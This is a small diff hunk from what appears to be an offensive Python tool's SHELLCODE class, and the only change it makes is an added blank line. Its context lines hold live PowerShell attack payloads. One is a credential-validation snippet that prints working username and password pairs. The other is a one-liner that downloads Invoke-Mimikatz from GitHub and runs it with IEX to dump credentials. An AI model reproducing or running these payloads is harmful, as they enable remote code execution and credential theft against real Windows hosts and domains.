@@ -192,6 +192,7 @@ class SHELLCODE(object):
         "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
         "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
         "echo \' CORRECT:\'$user\':\'$pass}}")
+    
 
     windows_invoke_mimikatz = (
         "IEX (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\\\");"
